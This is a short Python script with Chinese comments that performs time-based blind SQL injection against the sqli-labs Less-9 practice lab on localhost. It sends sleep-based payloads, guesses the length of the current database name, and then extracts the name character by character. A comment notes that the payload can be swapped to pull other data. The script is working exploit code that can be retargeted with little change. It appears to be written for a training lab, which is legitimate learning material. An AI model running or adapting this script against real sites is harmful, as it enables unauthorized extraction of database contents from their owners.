import requests
value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
data=""
 
'''
获取当前数据库的名字，布尔盲注脚本
'''
url = "http://localhost/sqli-labs/Less-9/?id=1' and if((ascii(substr(({0} limit 1,1),{1},1)) = '{2}'),sleep(3),NULL); %23"
url_length="http://localhost/sqli-labs/Less-9/?id=1' and if((length(({0} limit 1,1))={1} ),sleep(3),NULL); %23"
def get_length(payload):
    for n in range(1,100):
        url= url_length.format(payload,n)
        #print(url)
        if(get_respone(url)):
            print("[+] length is {0}".format(n))
            return n

def get_data(payload,value,length):
    for n in range(1,length):
        for v in value :
            url_data = url.format(payload,n,ord(v)) #ord（）返回字符的ASCII码
            #print(url_data)
            if(get_respone(url_data)):
                global data
                data=data+v
                print("[+] data is {0}".format(data))
                break

def get_respone(url):
    try:
        html = requests.get(url,timeout=2)
        return False
    except Exception as e:
        print("......")
        return True
#可以更改payload 来获取需要的数据
databse_payload ="select database()"
get_data(databse_payload,value,get_length(databse_payload)+1)